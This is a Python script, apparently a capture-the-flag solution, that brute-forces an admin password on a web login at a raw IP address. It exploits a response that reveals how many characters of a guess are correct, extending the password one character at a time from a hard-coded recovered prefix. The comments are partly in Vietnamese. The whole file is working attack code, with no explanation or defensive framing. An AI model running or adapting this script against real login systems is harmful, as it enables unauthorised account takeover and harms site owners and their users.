import requests
import re
import string
import time

BASE = "http://52.59.124.14:5015"
LOGIN_URL = f"{BASE}/login.php"
INDEX_URL = f"{BASE}/index.php"
DASHBOARD_URL = f"{BASE}/dashboard.php"

USERNAME = "admin"
CHARSET = string.ascii_letters + string.digits + "{}_"

session = requests.Session()

def correct_chars(password_guess: str) -> int:
    data = {"username": USERNAME, "password": password_guess}
    session.post(LOGIN_URL, data=data, allow_redirects=False)
    flash = session.get(INDEX_URL).text

    # In ra thông báo để kiểm tra
    msg = re.search(r"(Invalid .*|Logged in.*)", flash)
    if msg:
        print(f"[DEBUG] {password_guess!r} -> {msg.group(1)}")
    else:
        print(f"[DEBUG] {password_guess!r} -> (no flash)")

    m = re.search(r"got (\d+) characters correct", flash)
    if m:
        return int(m.group(1))
    if "Logged in as" in flash or "Dashboard" in flash:
        return len(password_guess)  # login thành công
    return -1

def brute_force(start_prefix=""):
    found = start_prefix
    while True:
        extended = False
        for ch in CHARSET:
            attempt = found + ch
            correct = correct_chars(attempt)
            time.sleep(0.2)
            if correct == len(attempt):
                found = attempt
                print("[+] Found so far:", found)
                extended = True
                # check dashboard
                dash = session.get(DASHBOARD_URL).text
                if "Dashboard" in dash:
                    print("\n[*] Admin password =", found)
                    return found
                break
        if not extended:
            print("[!] Không tìm được ký tự tiếp theo. Prefix hiện tại:", found)
            return found

if __name__ == "__main__":
    brute_force("YzUnh2ruQix9mBW")
